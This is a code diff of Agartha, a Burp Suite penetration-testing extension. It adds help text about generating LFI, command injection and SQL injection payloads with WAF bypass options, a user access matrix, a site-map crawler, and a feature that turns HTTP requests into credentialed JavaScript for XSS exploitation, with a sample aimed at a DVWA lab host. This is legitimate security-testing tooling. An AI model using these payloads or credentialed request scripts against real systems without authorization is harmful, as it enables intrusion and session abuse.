+        <p>Agartha is a penetration testing tool which creates dynamic payload lists and user access matrix to reveal injection flaws and authentication/authorization issues. There are many different attack payloads alredy exist, but Agartha creates run-time, systematic and vendor-neutral payloads with many different possibilities and bypassing methods. It also draws attention to user session and URL relationships, which makes easy to find user access violations. And additionally, it converts Http requests to JavaScript to help digging up XSS issues more. </p>
+        <p>In summary:</p>
+        <ul>
+        <li><strong>Payload Generator</strong>: It creates payloads/wordlists for different attack types.<ul>
+        <li><strong>Local File Inclusion, Directory Traversal</strong>: It creates file dictionary lists with various encoding and escaping characters.</li>
+        <li><strong>Command Injection / Remote Code Execution</strong>: It creates command dictionary lists for both unix and windows environments with different combinations.</li>
+        <li><strong>SQL Injection</strong>: It creates Stacked Queries, Boolean-Based, Union-Based and Time-Based SQL Injection wordlist for various databases to help finding vulnerable spots.</li>
+        </ul>
+        </li>
+        <li><strong>Authorization Matrix</strong>: It creates an access matrix based on user sessions and URL lists, to determine authorization/authentication related violations. <ul>
+        <li>You can use <strong>&#39;SiteMap&#39;</strong> generator feature to create URL list. It will populate visible links automatically and the result will totally depend on the user&#39;s header.</li>
+        </ul>
+        </li>
+        <li>And <strong>Copy as JavaScript</strong>: It converts Http requests to JavaScript code for further XSS exploitation and more.<br/><br/></li>
+        </ul>
+        <p>Here is a small tutorial how to use.</p>
+        <h2>Installation</h2>
+        <p>You should download &#39;Jython&#39; file and set your environment first:</p>
+        <ul>
+        <li>Burp Menu &gt; Extender &gt; Options &gt; Python Environment &gt; Locate Jython standalone jar file (tested in Jython v2.7.3).</li>
+        </ul>
+        <p>You can install Agartha through official store: </p>
+        <ul>
+        <li>Burp Menu &gt; Extender &gt; BApp Store &gt; Agartha</li>
+        </ul>
+        <p>Or for manual installation:</p>
+        <ul>
+        <li>Burp Menu &gt; Extender &gt; Extensions &gt; Add &gt; Extension Type: Python &gt; Extension file(.py): Select &#39;agartha.py&#39; file</li>
+        </ul>
+        <p>After all, you will see &#39;Agartha&#39; tab in the main window and it will be also registered the right click, under: </p>
+        <ul>
+        <li>&#39;Extensions &gt; Agartha - LFI, RCE, SQLi, Auth, HTTP to JS&#39;, with two sub-menus<ul>
+        <li>&#39;Authorization Matrix&#39;</li>
+        <li>&#39;Copy as JavaScript&#39;<br/><br/></li>
+        </ul>
+        </li>
+        </ul>
+        <h2>Local File Inclusion, Directory Traversal</h2>
+        <p>It both supports unix and windows file syntax. You can generate any wordlists dynamically for the path you want. You just need to supply a file path and that&#39;s all. </p>
+        <ul>
+        <li><strong>&#39;Depth&#39;</strong> is representation of how deep the wordlist should be. You can generate wordlists &#39;till&#39; or &#39;equal to&#39; this value.</li>
+        <li><strong>&#39;Waf Bypass&#39;</strong> asks for if you want to include all bypass features; like null bytes, different encoding, etc.</li>
+        </ul>
+        <p><img width=\"1000\" alt=\"Directory Traversal/Local File Inclusion wordlist\" src=\"https://github.com/volkandindar/agartha/assets/50321735/f08653e3-41ee-4cbe-bcd9-9a197005f5c9\"><br/><br/></p>
+        <h2>Command Injection / Remote Code Execution</h2>
+        <p>It creates command execution dynamic wordlists with the command you supply. It combines different separators and terminators for both unix and windows environments together.</p>
+        <ul>
+        <li><strong>&#39;URL Encoding&#39;</strong> encodes dictionary output.</li>
+        </ul>
+        <p><img width=\"1000\" alt=\"Remote Code Execution wordlist\" src=\"https://github.com/volkandindar/agartha/assets/50321735/1e83b404-f4f8-4d5d-a61e-07a9b8057be4\"><br/><br/></p>
+        <h2>SQL Injection</h2>
+        <p>It generates payloads for Stacked Queries, Boolean-Based, Union-Based, Time-Based SQL Injection attacks, and you do not need to supply any inputs. You just pick what type of SQL attacks and databases you want, then it will generate a wordlist with different combinations. </p>
+        <ul>
+        <li><strong>&#39;URL Encoding&#39;</strong> encodes dictionary output.</li>
+        <li><strong>&#39;Waf Bypass&#39;</strong> asks for if you want to include all bypass features; like null bytes, different encoding, etc.</li>
+        <li><strong>&#39;Union-Based&#39;</strong> ask for how deep the payload should be. The default value is 5.</li>
+        <li>And the rest is related with databases and attack types.</li>
+        </ul>
+        <p><img width=\"1000\" alt=\"SQL Injection wordlist\" src=\"https://github.com/volkandindar/agartha/assets/50321735/f8f86e68-ad2f-4a14-b76a-0c679f1f1673\"><br/><br/></p>
+        <h2>Authorization Matrix / User Access Table</h2>
+        <p>This part focuses on user session and URLs relationships to determine access violations. The tool will visit all URLs from pre-defined user sessions and fill the table with all Http responses. It is a kind of access matrix and helps to find out authentication/authorization issues. Afterwards you will see what users can access what page contents.</p>
+        <ul>
+        <li>You can right click on any request (&#39;Extensions &gt; Agartha &gt; Authorization Matrix&#39;) to define <strong>user sessions</strong>.</li>
+        <li>Next, you need to provide <strong>URL addresses</strong> the user (Http header/session owner) can visit. You can use internal &#39;SiteMap&#39; generator feature or supply any manual list. </li>
+        <li>And then, you can use <strong>&#39;Add User&#39;</strong> button to add the user sessions.</li>
+        <li>Now, it is ready for execution with only clicking <strong>&#39;Run&#39;</strong> button, and it will fill the table.</li>
+        </ul>
+        <img width=\"1000\" alt=\"Authorization Matrix\" src=\"https://github.com/volkandindar/agartha/assets/50321735/167293ad-28a7-4cd4-8ca8-e8a34e316e81\">
+        
+        <p>A little bit more details:</p>
+        <ol>
+        <li>What&#39;s username for the session you provide. You can add up to 4 different users and each user will have a different color to make it more readable.<ul>
+        <li>&#39;Add User&#39; for adding user sessions to matrix.</li>
+        <li>You can change Http request method between &#39;GET&#39; and POST.</li>
+        <li>&#39;Reset&#39; button clear all contents.</li>
+        <li>&#39;Run&#39; button execute the task and the result will show user access matrix.</li>
+        <li>&#39;Warnings&#39; indicates possible issues in different colors.</li>
+        <li>&#39;SiteMap&#39; button generates URL list automatically and the result totally depends on the user&#39;s header/session. Visible URLs will be populated in next textbox and you can still modify it.</li>
+        <li>&#39;Crawl Depth&#39; is defination for how many sub-links (max depth) &#39;SiteMap&#39; spider should go and detect links.</li>
+        </ul>
+        </li>
+        <li>It is the field for request headers and all URLs will be visited over the session defined in here.</li>
+        <li>URL addresses that user can visit. You can create this list with manual effort or use <strong>&#39;SiteMap&#39;</strong> generator feature. You need to provide visitable URL lists for each users.</li>
+        <li>All URLs you supply will be in here and they will be visited with the corresponding user sessions.</li>
+        <li>No authentication column. All cookies, tokens and possible session parameters will be removed form Http calls.</li>
+        <li>The rest of columns belong to users you created respectively and each of them has a unique color which indicates the URL owners.  </li>
+        <li>Cell titles show Http &#39;response codes:response lengths&#39; for each user sessions.</li>
+        <li>Just click the cell you want to examine and Http details will be shown in the bottom.</li>
+        </ol>
+        <img width=\"1000\" alt=\"User Access Table Details\" src=\"https://github.com/volkandindar/agartha/assets/50321735/4418ad6f-cd24-425e-bd3b-00dfdfda8c4f\">
+        
+        <p>After clicking &#39;RUN&#39;, the tool will fill user and URL matrix with different colors. Besides the user colors, you will see orange, yellow and red cells. The URL address does not belong to the user, and if the cell color is:</p>
+        <ul>
+        <li>Yellow, because the response returns &#39;HTTP 302&#39; with authentication/authorization concerns</li>
+        <li>Orange, because the response returns &#39;HTTP 200&#39; but different content length, with authentication/authorization concerns</li>
+        <li>Red, because the response returns &#39;HTTP 200&#39; and same content length, with authentication/authorization concerns</li>
+        </ul>
+        <p>You may also notice, it support only one Http request method and user session at the same time, because it processes bulk requests and it is not possible to provide different header options for each calls. But you may play with &#39;GET/POST&#39; methods to see response differences.<br/><br/></p>
+        <h2>Copy as JavaScript</h2>
+        <p>The feature is for converting Http requests to JavaScript code. It can be useful to dig up further XSS issues and bypass header restrictions.</p>
+        <p>To access it, right click any Http request and &#39;Extensions &gt; Agartha &gt; Copy as JavaScript&#39;.</p>
+        <img width=\"1000\" alt=\"Copy as JavaScript\" src=\"https://github.com/volkandindar/agartha/assets/50321735/4605b296-4c94-456c-b5b2-c8042a348cd2\">
+        
+        <p>It will automatically save it to your clipboard with some remarks. For example:</p>
+        <pre><code>
+        Http request with minimum header paramaters in JavaScript:
+            &lt;script&gt;var xhr=new XMLHttpRequest();
+                xhr.open(&#39;GET&#39;,&#39;http://dvwa.local/vulnerabilities/xss_r/?name=XSS&#39;);
+                xhr.withCredentials=true;
+                xhr.send();
+            &lt;/script&gt;
+        
+        Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:
+            &lt;script&gt;var xhr=new XMLHttpRequest();
+                xhr.open(&#39;GET&#39;,&#39;http://dvwa.local/vulnerabilities/xss_r/?name=XSS&#39;);
+                xhr.withCredentials=true;
+                xhr.setRequestHeader(&#39;Host&#39;,&#39; dvwa.local&#39;);
+                xhr.setRequestHeader(&#39;User-Agent&#39;,&#39; Mozilla/5.0 Gecko/20100101 Firefox/114.0&#39;);
+                xhr.setRequestHeader(&#39;Accept&#39;,&#39; text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;);
+                xhr.setRequestHeader(&#39;Accept-Language&#39;,&#39; en-GB,en;q=0.5&#39;);
+                xhr.setRequestHeader(&#39;Accept-Encoding&#39;,&#39; gzip, deflate&#39;);
+                xhr.setRequestHeader(&#39;Connection&#39;,&#39; close&#39;);
+                xhr.setRequestHeader(&#39;Referer&#39;,&#39; http://dvwa.local/vulnerabilities/xss_r/&#39;);
+                xhr.setRequestHeader(&#39;Upgrade-Insecure-Requests&#39;,&#39; 1&#39;);
+                xhr.send();
+            &lt;/script&gt;
+        
+        For redirection, please also add this code before &#39;&lt;/script&gt;&#39; tag:
+            xhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader(&#39;Location&#39;);return ajax.call(this,location);}};
+        </code></pre>
+        <p>Please note that, the JavaScript code will be called over original user session and many header fields will be filled automatically by browsers. In some cases, the server may require some header field mandatory, and therefore you may need to modify the code for an adjustment.
+        """
+        htmlString +="</td></tr></table></body></html>"
         self.editorPaneInfo.setText(htmlString);
         self.editorScrollPaneInfo = JScrollPane(self.editorPaneInfo);
         self.editorScrollPaneInfo.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
@@ -946,12 +1022,12 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._lblStatusLabel = JLabel()
         self._lblStatusLabel.setText("Please provide a path for payload generation!")
         self._txtTargetPath = JTextField(self._txtDefaultLFI, 30)
-        self._rbDictLFI = JRadioButton('LFI/DT', True, itemStateChanged=self.funcRBSelection);
-        self._rbDictLFI.setToolTipText("It generates payload for Local File Inclusion, Directory Traversal.")
+        self._rbDictLFI = JRadioButton('LFI / DT', True, itemStateChanged=self.funcRBSelection);
+        self._rbDictLFI.setToolTipText("Payload generation for Local File Inclusion, Directory Traversal.")
         self._rbDictCommandInj = JRadioButton('Command Inj / RCE', itemStateChanged=self.funcRBSelection)
-        self._rbDictCommandInj.setToolTipText("It generates payload for Command Injection, Remote Code Execution.")
+        self._rbDictCommandInj.setToolTipText("Payload generation for Command Injection, Remote Code Execution.")
         self._rbDictSQLi = JRadioButton('SQL Injection', itemStateChanged=self.funcRBSelection)
-        self._rbDictSQLi.setToolTipText("It generates payload for various type of SQL attacks.")
+        self._rbDictSQLi.setToolTipText("Payload generation for various type of SQL attacks.")
         _rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
         _rbDictFuzzer = JRadioButton('Fuzzer', itemStateChanged=self.funcRBSelection)
         _rbPanel = JPanel()
@@ -967,10 +1043,10 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._cbDictWafBypass = JCheckBox('Waf Bypass', True)
         self._cbDictWafBypass.setToolTipText("It includes bypass techniques like null bytes, various type of encodings, different file extensions, etc.")
         self._cbDictEquality = JCheckBox(')', False)
-        self._cbDictEquality.setToolTipText("Generate payloads only for some certain folder depth.")
-        self._cbDictDepth = JComboBox(list(range(0, 20)))        
+        self._cbDictEquality.setToolTipText("Generate payloads only for a specific depth.")
+        self._cbDictDepth = JComboBox(list(range(0, 20)))
         self._cbDictDepth.setSelectedIndex(5)
-        self._cbDictDepth.setToolTipText("How deep the folder depth should be?")
+        self._cbDictDepth.setToolTipText("Folder depth limit. How much folder above should it go?")
         _cbDictDepthPanel = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
         _cbDictDepthPanel.add(self._cbDictDepth)
         self._cbDictCommandInjEncoding = JCheckBox('URL Encoding', False)
@@ -987,13 +1063,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._cbUnionDepth = JComboBox(list(range(1, 20)))
         self._cbUnionDepth.setSelectedIndex(4)
         self._cbUnionDepth.setEnabled(False)
-        self._cbUnionDepth.setToolTipText("Generates payload till")
-        self._cbOrderBased = JCheckBox('Order-Based', False, itemStateChanged=self._cbOrderBasedFunc)
-        self._cbOrderBased.setToolTipText("Order-Based SQL Injection")
-        self._cbOrderDepth = JComboBox(list(range(1, 20)))
-        self._cbOrderDepth.setSelectedIndex(4)
-        self._cbOrderDepth.setEnabled(False)
-        self._cbOrderDepth.setToolTipText("Generates payload till")
+        self._cbUnionDepth.setToolTipText("Column numbers")
         self._cbBooleanBased = JCheckBox('Boolean-Based', True)
         self._cbBooleanBased.setToolTipText("Boolean-Based SQL Injection")
         self._cbMssqlBased = JCheckBox('MSSQL', True)
@@ -1034,8 +1104,6 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._tabDictPanel_SQLi.add(self._cbTimeBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbUnionBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbUnionDepth, BorderLayout.PAGE_START)
-        self._tabDictPanel_SQLi.add(self._cbOrderBased, BorderLayout.PAGE_START)
-        self._tabDictPanel_SQLi.add(self._cbOrderDepth, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.setVisible(False)
         _tabDictPanel_1.add(self._tabDictPanel_LFI, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(self._cbDictCommandInjOpt, BorderLayout.PAGE_START)
@@ -1069,12 +1137,12 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
     def tableMatrixReset(self, ev):
         self.tableMatrix = []        
-        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLS','NoAuth'))
+        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
         self.tableMatrix = JTable(self.tableMatrix_DM)
         self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
         self.userCount = 0
         self.userNames = []
-        self.userNames.append("NoAuth")
+        self.userNames.append("No Authentication")
         self.userNamesHttpReq = []
         self.userNamesHttpReq.append("")
         self.userNamesHttpUrls = [[]]
@@ -1082,19 +1150,21 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self.httpReqRes.append([])      
         self._requestViewer.setMessage("", False)
         self._responseViewer.setMessage("", False)
-        self._lblAuthNotification.text = "Please add users to create an auth matrix"
+        self._lblAuthNotification.text = "Please add users to create an auth matrix!"
+        self._lblAuthNotification.setForeground (Color.black)
         self._tbAuthNewUser.setForeground (Color.black)        
         self._txtHeaderDefault = "GET /example HTTP/1.1\nHost: localhost.com\nAccept-Encoding: gzip,deflate\nConnection: close\nCookie: SessionID=......"
         self._tbAuthHeader.setText(self._txtHeaderDefault)
         self._txtURLDefault = "http://localhost.com/example"
         self._tbAuthURL.setText(self._txtURLDefault)
         self._txtUserDefault = "User1"
-        self._tbAuthNewUser.text = self._txtUserDefault
+        self._tbAuthNewUser.text = self._txtUserDefault.strip()
         self._btnAuthRun.setEnabled(False)
         self._btnAuthReset.setEnabled(False)
         self._cbAuthColoring.setEnabled(False)
         self._cbAuthGETPOST.setEnabled(False)
         self._cbAuthGETPOST.setSelectedIndex(0)
+        self._cbSiteMapDepth.setSelectedIndex(3)
         self._btnAuthNewUserAdd.setEnabled(True)
         self.progressBar.setValue(0)
         self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
@@ -1104,6 +1174,131 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._tabAuthSplitpaneHttp.setDividerLocation(0.5)
 
         return
+
+    def siteMapGenerator(self, ev):
+        t = Thread(target=self.siteMapGeneratorThread, args=[self])
+        t.start()
+        return
+
+    def siteMapGeneratorThread(self, ev):
+        if not self._tbAuthURL.getText().split('\n')[0].strip():
+            self._lblAuthNotification.text = "Please provide a valid URL."
+            self._lblAuthNotification.setForeground (Color.red)
+            return
+
+        _urlAdd = self._tbAuthURL.getText().split('\n')[0].strip()
+
+        if not self.isURLValid(str(_urlAdd)) or _urlAdd == self._txtURLDefault:
+            self._tbAuthURL.setForeground (Color.red)
+            self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _urlAdd + "'"
+            self._lblAuthNotification.setForeground (Color.red)
+            return
+        self._tbAuthURL.setForeground (Color.black)
+        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
+            self._tbAuthHeader.setForeground (Color.red)
+            self._lblAuthNotification.text = "Please provide a valid header!"
+            self._lblAuthNotification.setForeground (Color.red)
+            return        
+        self._tbAuthHeader.setForeground (Color.black)        
+        self._lblAuthNotification.setForeground (Color.black)
+
+        self._lblAuthNotification.text = "The crawler has just started. Please bear in mind, links based on Javascript may not be detected properly."
+        
+        _userURLs = []
+        _userURLs.append(_urlAdd)
+        folderDepth = 0
+        crawledURLs = 0
+        header = self._tbAuthHeader.getText()
+        userLinks = _urlAdd + "\n"
+
+        for _url in _userURLs:
+            try:
+                # changing url in the request header
+                if str(urlparse.urlparse(_url).path):
+                    # check if query string exists
+                    if str(urlparse.urlparse(_url).query):
+                        header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + str(urlparse.urlparse(_url).path + "?" + urlparse.urlparse(_url).query))
+                    else:
+                        header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + str(urlparse.urlparse(_url).path))
+                else:
+                    header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + "/")
+                
+                # header methods
+                if "GET" in header[:3]:
+                    # request was in GET method and will be in POST
+                    if self._cbAuthGETPOST.getSelectedIndex() == 1:
+                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
+                else:
+                    # request was in POST alike method and will be in GET
+                    if self._cbAuthGETPOST.getSelectedIndex() == 0:
+                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
+                
+                portNum = 80
+                if urlparse.urlparse(_url).port:
+                    portNum = urlparse.urlparse(_url).port
+                else:
+                    if urlparse.urlparse(_url).scheme == "https":
+                        portNum = 443
+
+                _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(_url).hostname, portNum, urlparse.urlparse(_url).scheme), header)
+                msgBody = self._helpers.bytesToString(_httpReqRes.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset():])
+
+                if msgBody:
+                    links = re.findall("(https?://[^\\s\'\"<]+)", msgBody, re.IGNORECASE)
+                    for link in links:
+                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]
+                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(r'(log|sign|time).*(off|out|in|on)|(error|expire|kill|terminat|delete|remove)', link, re.IGNORECASE)) and "/." not in link and not any(re.findall(r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff|woff2|ttf)$', _ext, re.IGNORECASE)):
+                            _userURLs.append(link)
+                            userLinks = userLinks + link + "\n"
+
+                    links = re.findall("<a\\s+[^>]*?href=[\'|\"](.*?)[\'\"].*?>", msgBody, re.IGNORECASE)
+                    for link in (links.pop(0) for _ in xrange(len(links))):
+                        if not ".." in link:
+                            link = link.replace("/.", "/")
+                        if link == ".":
+                            link = "/"
+                        if "%3a" in link[0:10]:
+                            link =  urllib.unquote(link)
+
+                        if link.startswith('/'):
+                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + link
+                        elif link.startswith('#'): 
+                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + urlparse.urlparse(_url)[2] + link
+                        elif link.startswith('..'):
+                            path = urlparse.urlparse(_url)[2]
+                            if not path.endswith('/'):
+                                path = str(urlparse.urlparse(_url)[2]).rsplit('/', 1)[0] + "/"
+                            _endswith =""
+                            if link.endswith('/'):
+                                _endswith ="/"
+                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + str(posixpath.normpath(path + link)) + _endswith
+                        elif link.startswith('javascript'):
+                            link = ""
+                            continue
+                        elif not link.startswith('http') and link:
+                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + '/' + link
+                        else: 
+                            link = ""
+                            continue
+
+                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]
+
+                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(r'(log|sign|time).*(off|out|in|on)|(error|expire|kill|terminat|delete|remove)', link, re.IGNORECASE)) and "/." not in link and not any(re.findall(r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff|woff2|ttf)$', _ext, re.IGNORECASE)):
+                            _userURLs.append(link)
+                            userLinks = userLinks + link + "\n"
+                            self._lblAuthNotification.text = "The crawler has found " + str(len(_userURLs)) + " links so far, and it is still in progress: '" + str(_userURLs.index(_url) + 1) + "/" + str(crawledURLs + 1) + "', current folder depth: '" + str(folderDepth) + "'."
+
+                if _userURLs.index(_url) == crawledURLs:
+                    if folderDepth == self._cbSiteMapDepth.getSelectedIndex():
+                        break
+                    crawledURLs = len(_userURLs) - 1
+                    folderDepth = folderDepth + 1
+                
+            except:
+                self._lblAuthNotification.text = str(sys.exc_info()[1])
+        
+        self._tbAuthURL.setText(userLinks)
+        self._lblAuthNotification.text = "The crawler has just finished, and " + str(len(_userURLs)) + " links have been found. Other hosts than user session are ignored." 
 
 class UserEnabledRenderer(TableCellRenderer):
     def __init__(self, defaultCellRender, userNamesHttpUrls):
@@ -1129,40 +1324,41 @@ class UserEnabledRenderer(TableCellRenderer):
                 # no auth
                 cell.setBackground(self.colorsAlert[0])
                 if _colorful:
-                    for y in range(2, table.getColumnCount()):                        
-                        if table.getValueAt(row, y) == table.getValueAt(row, column):                        
-                            if table.getValueAt(row, y).startswith("HTTP 2"):
-                                cell.setBackground(self.colorsAlert[1])
-                                toolTipMessage = "The URL returns HTTP 2XX without authentication!"
-                            elif table.getValueAt(row, y).startswith("HTTP 3"):
-                                if not cell.getBackground() == self.colorsAlert[1]:
-                                    toolTipMessage = "The URL returns HTTP 3XX without authentication!"
-                        elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
+                    for y in range(2, table.getColumnCount()):
+                        if table.getValueAt(row, 0) in self.urlList[y - 1]:
+                            if table.getValueAt(row, y) == table.getValueAt(row, column):
+                                if table.getValueAt(row, y).startswith("HTTP 2"):
+                                    cell.setBackground(self.colorsAlert[1])
+                                    toolTipMessage = "The URL returns HTTP 2XX without authentication, and the response is same as URL owner!"
+                                elif table.getValueAt(row, y).startswith("HTTP 3"):
+                                    if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
+                                        cell.setBackground(self.colorsAlert[3])
+                                        toolTipMessage = "The URL returns HTTP 3XX without authentication, but the response is same as URL owner!"
+                            elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                 if not cell.getBackground() == self.colorsAlert[1]:
                                     cell.setBackground(self.colorsAlert[2])
-                                    toolTipMessage = "The URL returns HTTP 2XX with different length without authentication!"
-            elif table.getValueAt(row, 0) in self.urlList[column- 1]:
-                cell.setBackground(self.colorsUser[column-2])
+                                    toolTipMessage = "The URL returns same HTTP response code with URL owner, but no authentication!"
+            elif table.getValueAt(row, 0) in self.urlList[column - 1]:
+                cell.setBackground(self.colorsUser[column - 2])
                 toolTipMessage = "Http response of the user's own URL!"
             else:    
                 # other users
                 cell.setBackground(self.colorsAlert[0])
                 if _colorful:
                     for y in range(2, table.getColumnCount()):
-                        if table.getValueAt(row, y) == table.getValueAt(row, column):
-                        # responses are same: red or yellow
-                            if table.getValueAt(row, y).startswith("HTTP 2"):
-                                cell.setBackground(self.colorsAlert[1])
-                                toolTipMessage = "The URL is not in the user's list but returns HTTP 2XX!"
-                            elif table.getValueAt(row, y).startswith("HTTP 3"):
-                                if not cell.getBackground() == self.colorsAlert[1]:
-                                    cell.setBackground(self.colorsAlert[3])
-                                    toolTipMessage = "The URL is not in the user's list and returns HTTP 3XX!"
-                        elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
-                        # response lengths are different, but responses code might be the same
-                            if not cell.getBackground() == self.colorsAlert[1]:    
-                                cell.setBackground(self.colorsAlert[2])
-                                toolTipMessage = "The URL is not in the user's list but returns HTTP 2XX with different length!"
+                        if table.getValueAt(row, 0) in self.urlList[y - 1]:
+                            if table.getValueAt(row, y) == table.getValueAt(row, column):
+                                if table.getValueAt(row, y).startswith("HTTP 2"):
+                                    cell.setBackground(self.colorsAlert[1])
+                                    toolTipMessage = "The URL is not in the user's list, but the response is same as URL owner"
+                                elif table.getValueAt(row, y).startswith("HTTP 3"):
+                                    if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
+                                        cell.setBackground(self.colorsAlert[3])
+                                        toolTipMessage = "The URL is not in the user's list, but the response is same as URL owner!"
+                            elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
+                                if not cell.getBackground() == self.colorsAlert[1]:    
+                                    cell.setBackground(self.colorsAlert[2])
+                                    toolTipMessage = "The URL is not in the user's list, but returns same HTTP response code with URL owner!"
         except:
             cell.setBackground(self.colorsAlert[0])
 
